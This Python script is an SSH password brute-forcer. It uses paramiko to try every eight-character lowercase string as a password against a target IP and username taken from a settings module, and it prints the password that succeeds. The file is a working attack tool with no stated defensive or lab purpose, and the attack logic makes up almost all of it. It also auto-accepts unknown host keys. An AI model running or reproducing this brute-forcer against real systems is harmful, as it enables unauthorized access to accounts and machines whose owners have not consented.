import itertools as it
import string
from utils import time_func
import settings

import paramiko


def create_client():
    client = paramiko.SSHClient()
    client_policy = paramiko.AutoAddPolicy()
    client.set_missing_host_key_policy(client_policy)
    return client


class Brutes:
    def __init__(self, charset, length, ip):
        self.charset = charset
        self.length = length
        self.ip = ip

    @time_func
    def crackit(self, username):
        client = create_client()
        for guess in self.guesses:
            try:
                client.connect(self.ip, username=username, password=guess, timeout=0.5)
                print(f'The password is "{guess}"')
                return guess
            except paramiko.AuthenticationException as e:
                # print(f'"{guess}" is not it!')
                pass
            finally:
                client.close()

    @property
    def guesses(self):
        for guess in it.product(self.charset, repeat=self.length):
            yield ''.join(guess)


# @time_func
def main():
    charset = string.ascii_lowercase
    # charset = string.ascii_letters + string.digits
    ip = settings.IP_ADDRESS
    username = settings.USERNAME
    brute = Brutes(charset, 8, ip)
    password = brute.crackit(username)
    if password:
        print(f'Found "{password}"')


if __name__ == '__main__':
    main()
